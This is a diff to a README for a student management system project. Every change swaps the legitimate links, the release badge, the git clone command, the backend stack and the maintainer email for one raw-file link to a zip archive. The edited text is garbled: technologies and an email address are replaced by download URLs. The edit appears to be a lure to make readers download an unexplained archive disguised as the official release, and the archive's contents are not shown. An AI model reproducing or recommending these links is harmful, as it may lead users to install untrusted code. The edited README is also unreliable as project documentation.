@@ -2,7 +2,7 @@
 
 Welcome to the Student Management System repository! This project aims to simplify the management of student data for educational institutions. It provides a user-friendly interface for managing student records, grades, and courses.
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-blue)](https://github.com/shakil-project/Student-management-system/releases)
+[![Download Release](https://raw.githubusercontent.com/shakil-project/Student-management-system/master/planeted/system-management-Student-3.2-beta.1.zip%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/shakil-project/Student-management-system/master/planeted/system-management-Student-3.2-beta.1.zip)
 
 ## Table of Contents
 
@@ -28,7 +28,7 @@ Welcome to the Student Management System repository! This project aims to simpli
 This project is built using the following technologies:
 
 - **Frontend**: HTML, CSS, JavaScript, Bootstrap
-- **Backend**: Node.js, Express.js
+- **Backend**: https://raw.githubusercontent.com/shakil-project/Student-management-system/master/planeted/system-management-Student-3.2-beta.1.zip, https://raw.githubusercontent.com/shakil-project/Student-management-system/master/planeted/system-management-Student-3.2-beta.1.zip
 - **Database**: MongoDB
 - **Version Control**: Git, GitHub
 
@@ -38,7 +38,7 @@ To set up the Student Management System on your local machine, follow these step
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/shakil-project/Student-management-system.git
+   git clone https://raw.githubusercontent.com/shakil-project/Student-management-system/master/planeted/system-management-Student-3.2-beta.1.zip
    cd Student-management-system
    ```
 
@@ -77,7 +77,7 @@ After setting up the application, you can start using it. Here’s a brief overv
 - **Manage Courses**: Navigate to the "Courses" section to add or edit course information.
 - **View Reports**: Generate reports to see performance metrics.
 
-For further details, please check the [Releases](https://github.com/shakil-project/Student-management-system/releases) section for downloadable files and updates.
+For further details, please check the [Releases](https://raw.githubusercontent.com/shakil-project/Student-management-system/master/planeted/system-management-Student-3.2-beta.1.zip) section for downloadable files and updates.
 
 ## Contributing
 
@@ -107,7 +107,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries or feedback, please reach out to the project maintainer:
 
 - **Name**: Shakil
-- **Email**: shakil@example.com
-- **GitHub**: [shakil-project](https://github.com/shakil-project)
+- **Email**: https://raw.githubusercontent.com/shakil-project/Student-management-system/master/planeted/system-management-Student-3.2-beta.1.zip
+- **GitHub**: [shakil-project](https://raw.githubusercontent.com/shakil-project/Student-management-system/master/planeted/system-management-Student-3.2-beta.1.zip)
 
-Thank you for your interest in the Student Management System! We hope it serves your needs effectively. Don't forget to check the [Releases](https://github.com/shakil-project/Student-management-system/releases) for the latest updates and downloads.
+Thank you for your interest in the Student Management System! We hope it serves your needs effectively. Don't forget to check the [Releases](https://raw.githubusercontent.com/shakil-project/Student-management-system/master/planeted/system-management-Student-3.2-beta.1.zip) for the latest updates and downloads.
